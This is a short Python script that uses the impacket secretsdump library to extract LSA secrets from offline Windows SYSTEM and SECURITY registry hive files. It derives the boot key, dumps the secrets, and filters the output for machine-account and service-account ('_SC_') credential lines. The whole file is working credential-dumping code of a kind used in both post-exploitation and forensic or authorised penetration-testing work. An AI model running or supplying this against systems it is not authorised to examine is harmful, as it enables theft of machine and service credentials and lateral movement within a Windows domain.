"""Offline LSA secret dump limited to the machine account, with diagnostics."""
import io
import sys
import traceback
from contextlib import redirect_stdout

from impacket.examples.secretsdump import LocalOperations, LSASecrets

system_hive = sys.argv[1]
security_hive = sys.argv[2]

try:
    local_ops = LocalOperations(system_hive)
    boot_key = local_ops.getBootKey()
    sys.stderr.write("bootkey len=%d\n" % len(boot_key))

    lsa = LSASecrets(security_hive, boot_key, None, isRemote=False)

    buf = io.StringIO()
    with redirect_stdout(buf):
        lsa.dumpSecrets()
    text = buf.getvalue()
    sys.stderr.write("dumpSecrets output chars=%d, lines=%d\n" % (len(text), len(text.splitlines())))

    for line in text.splitlines():
        low = line.lower()
        if "machine" in low or "$mac" in low or "_sc_" in low:
            print("MATCH:", line)
except Exception:
    traceback.print_exc()
